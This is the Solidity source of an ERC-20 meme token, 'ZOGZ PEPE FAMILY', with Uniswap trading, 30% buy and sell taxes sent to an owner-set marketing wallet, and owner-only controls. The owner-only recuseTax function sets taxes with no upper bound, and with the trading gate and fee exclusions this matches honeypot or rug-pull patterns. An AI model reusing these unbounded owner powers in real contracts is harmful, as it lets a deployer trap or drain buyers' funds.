1 /*
2 
3  /$$$$$$$$  /$$$$$$   /$$$$$$  /$$$$$$$$
4 |_____ $$  /$$__  $$ /$$__  $$|_____ $$ 
5      /$$/ | $$  \ $$| $$  \__/     /$$/ 
6     /$$/  | $$  | $$| $$ /$$$$    /$$/  
7    /$$/   | $$  | $$| $$|_  $$   /$$/   
8   /$$/    | $$  | $$| $$  \ $$  /$$/    
9  /$$$$$$$$|  $$$$$$/|  $$$$$$/ /$$$$$$$$
10 |________/ \______/  \______/ |________/
11                 
12 */                        
13 
14 // SPDX-License-Identifier: MIT
15 
16 pragma solidity ^0.8.17;
17 
18 /*
19  * Telegram : https://t.me/ZOGZ_ERC
20 */
21 
22 interface IERC20 {
23     function decimals() external view returns (uint8);
24     function symbol() external view returns (string memory);
25     function name() external view returns (string memory);
26     function totalSupply() external view returns (uint256);
27     function balanceOf(address account) external view returns (uint256);
28     function transfer(address recipient, uint256 amount) external returns (bool);
29     function allowance(address owner, address spender) external view returns (uint256);
30     function approve(address spender, uint256 amount) external returns (bool);
31     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
32     event Transfer(address indexed from, address indexed to, uint256 value);
33     event Approval(address indexed owner, address indexed spender, uint256 value);
34 }
35 
36 interface IUniswapRouter {
37 
38     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
39     function factory() external pure returns (address);
40 
41     function WETH() external pure returns (address);
42 
43     function swapExactTokensForETHSupportingFeeOnTransferTokens(
44         uint amountIn,
45         uint amountOutMin,
46         address[] calldata path,
47         address to,
48         uint deadline
49     ) external;
50 
51 }
52 
53 interface IUniswapFactory {
54     function getPair(address tokenA, address tokenB) external view returns (address pair);
55     function createPair(address tokenA, address tokenB) external returns (address pair);
56 }
57 
58 abstract contract Ownable {
59     address internal _owner;
60 
61     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
62 
63     constructor () {
64         address msgSender = msg.sender;
65         _owner = msgSender;
66         emit OwnershipTransferred(address(0), msgSender);
67     }
68 
69     function owner() public view returns (address) {
70         return _owner;
71     }
72 
73     modifier onlyOwner() {
74         require(_owner == msg.sender, "you are not owner");
75         _;
76     }
77 
78     function renounceOwnership() public virtual onlyOwner {
79         emit OwnershipTransferred(_owner, address(0));
80         _owner = address(0);
81     }
82 
83     function transferOwnership(address newOwner) public virtual onlyOwner {
84         require(newOwner != address(0), "new is 0");
85         emit OwnershipTransferred(_owner, newOwner);
86         _owner = newOwner;
87     }
88 }
89 
90 contract Token is IERC20, Ownable {
91     mapping(address => uint256) private _balances;
92     mapping(address => mapping(address => uint256)) private _allowances;
93 
94     address payable private MarketingWallet;
95 
96     string private _name;
97     string private _symbol;
98     uint8 private _decimals;
99 
100     mapping(address => bool) public _isExcludeFromFee;
101     
102     uint256 private _totalSupply;
103 
104     IUniswapRouter public _uniswapRouter;
105 
106     mapping(address => bool) public isMarketPair;
107     bool private inSwap;
108 
109     uint256 private constant MAX = ~uint256(0);
110 
111     address public _uniswapPair;
112 
113     modifier lockTheSwap {
114         inSwap = true;
115         _;
116         inSwap = false;
117     }
118 
119     constructor (){
120 
121         _name = "ZOGZ PEPE FAMILY";
122         _symbol = "ZOGZ";
123         _decimals = 18;
124         uint256 Supply = 1000000000;
125 
126         _totalSupply = Supply * 10 ** _decimals;
127 
128         address receiveAddr = msg.sender;
129         _balances[receiveAddr] = _totalSupply;
130         emit Transfer(address(0), receiveAddr, _totalSupply);
131 
132         MarketingWallet = payable(msg.sender);
133         _walletMAX = _totalSupply * 2 / 100;
134 
135         _isExcludeFromFee[address(this)] = true;
136         _isExcludeFromFee[receiveAddr] = true;
137         _isExcludeFromFee[MarketingWallet] = true;
138 
139         IUniswapRouter swapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
140         _uniswapRouter = swapRouter;
141         _allowances[address(this)][address(swapRouter)] = MAX;
142 
143         IUniswapFactory swapFactory = IUniswapFactory(swapRouter.factory());
144         _uniswapPair = swapFactory.createPair(address(this), swapRouter.WETH());
145 
146         isMarketPair[_uniswapPair] = true;
147         IERC20(_uniswapRouter.WETH()).approve(
148             address(address(_uniswapRouter)),
149             ~uint256(0)
150         );
151         _isExcludeFromFee[address(swapRouter)] = true;
152 
153     }
154 
155     function setFundAddr(
156         address payable newAddr
157     ) public onlyOwner{
158         MarketingWallet = newAddr;
159     }
160 
161     function symbol() external view override returns (string memory) {
162         return _symbol;
163     }
164 
165     function name() external view override returns (string memory) {
166         return _name;
167     }
168 
169     function decimals() external view override returns (uint8) {
170         return _decimals;
171     }
172 
173     function totalSupply() public view override returns (uint256) {
174         return _totalSupply;
175     }
176 
177     function balanceOf(address account) public view override returns (uint256) {
178         return _balances[account];
179     }
180 
181     function transfer(address recipient, uint256 amount) public override returns (bool) {
182         _transfer(msg.sender, recipient, amount);
183         return true;
184     }
185 
186     function allowance(address owner, address spender) public view override returns (uint256) {
187         return _allowances[owner][spender];
188     }
189 
190     function approve(address spender, uint256 amount) public override returns (bool) {
191         _approve(msg.sender, spender, amount);
192         return true;
193     }
194 
195     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
196         _transfer(sender, recipient, amount);
197         if (_allowances[sender][msg.sender] != MAX) {
198             _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
199         }
200         return true;
201     }
202 
203     function _approve(address owner, address spender, uint256 amount) private {
204         _allowances[owner][spender] = amount;
205         emit Approval(owner, spender, amount);
206     }
207 
208     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
209         _balances[sender] -= amount;
210         _balances[recipient] += amount;
211         emit Transfer(sender, recipient, amount);
212         return true;
213     }
214 
215     uint256 public _buyCount=0;
216     uint256 private _initialBuyTax=0;
217     uint256 private _initialSellTax=0;
218     uint256 private _finalBuyTax=30;
219     uint256 private _finalSellTax=30;
220     uint256 private _reduceBuyTaxAt=0;
221     uint256 private _reduceSellTaxAt=0;
222     uint256 private _preventSwapBefore=0;
223 
224     function recuseTax(
225         uint256 newBuy,
226         uint256 newSell,
227         uint256 newReduceBuy,
228         uint256 newReduceSell,
229         uint256 newPreventSwapBefore
230     ) public onlyOwner {
231         _finalBuyTax = newBuy;
232         _finalSellTax = newSell;
233         _reduceBuyTaxAt = newReduceBuy;
234         _reduceSellTaxAt = newReduceSell;
235         _preventSwapBefore = newPreventSwapBefore;
236     }
237 
238     bool public remainHolder = true;
239     function changeRemain() public onlyOwner{
240         remainHolder = !remainHolder;
241     }
242 
243     uint256 public _walletMAX;
244 
245     function setWalletMax(uint8 percentage) public onlyOwner{
246         _walletMAX = totalSupply() * percentage / 100;
247     }
248 
249     function _transfer(
250         address from,
251         address to,
252         uint256 amount
253     ) private {
254         uint256 balance = balanceOf(from);
255         require(balance >= amount, "balanceNotEnough");
256 
257         if (inSwap){
258             _basicTransfer(from, to, amount);
259             return;
260         }
261 
262         bool takeFee;
263 
264         if (isMarketPair[to] && !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to] && _buyCount > _preventSwapBefore) {
265             uint256 _numSellToken = amount;
266             if (_numSellToken > balanceOf(address(this))){
267                 _numSellToken = _balances[address(this)];
268             }
269             if (_numSellToken > 0){
270                 swapTokenForETH(_numSellToken);
271             }
272         }
273 
274         if (!_isExcludeFromFee[from] && !_isExcludeFromFee[to] && !inSwap) {
275             require(startTradeBlock > 0);
276             takeFee = true;
277             
278             // buyCount
279             if (isMarketPair[from] && to != address(_uniswapRouter) && !_isExcludeFromFee[to]) {
280                 _buyCount++;
281                 require(balanceOf(to) + amount <= _walletMAX,"walletlimit");
282             }
283 
284             // remainHolder
285             if (remainHolder && amount == balance) {
286                 amount = amount - (amount / 10000);
287             }
288 
289         }
290 
291         _transferToken(from, to, amount, takeFee);
292     }
293 
294     function _transferToken(
295         address sender,
296         address recipient,
297         uint256 tAmount,
298         bool takeFee
299     ) private {
300         _balances[sender] = _balances[sender] - tAmount;
301         uint256 feeAmount;
302 
303         if (takeFee) {
304             uint256 taxFee;
305             if (isMarketPair[recipient]) {
306                 taxFee = _buyCount > _reduceSellTaxAt ? _finalSellTax : _initialSellTax;
307             } else if (isMarketPair[sender]) {
308                 taxFee = _buyCount > _reduceBuyTaxAt ? _finalBuyTax : _initialBuyTax;
309             }
310             uint256 swapAmount = tAmount * taxFee / 100;
311             if (swapAmount > 0) {
312                 feeAmount += swapAmount;
313                 _balances[address(this)] = _balances[address(this)] + swapAmount;
314                 emit Transfer(sender, address(this), swapAmount);
315             }
316         }
317 
318         _balances[recipient] = _balances[recipient] + (tAmount - feeAmount);
319         emit Transfer(sender, recipient, tAmount - feeAmount);
320 
321     }
322 
323     uint256 public startTradeBlock;
324     function startTrade() public onlyOwner {
325         startTradeBlock = block.number;
326     }
327 
328     function removeERC20(address _token) external {
329         if(_token != address(this)){
330             IERC20(_token).transfer(MarketingWallet, IERC20(_token).balanceOf(address(this)));
331             MarketingWallet.transfer(address(this).balance);
332         }
333     }
334 
335     function swapTokenForETH(uint256 tokenAmount) private lockTheSwap {
336         address[] memory path = new address[](2);
337         path[0] = address(this);
338         path[1] = _uniswapRouter.WETH();
339         _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
340             tokenAmount,
341             0,
342             path,
343             address(this),
344             block.timestamp
345         );
346 
347         uint256 _bal = address(this).balance;
348         if (_bal > 0){
349             MarketingWallet.transfer(_bal);
350         }
351     }
352 
353     function setFeeExclude(address account, bool value) public onlyOwner{
354         _isExcludeFromFee[account] = value;
355     }
356 
357     receive() external payable {}
358 }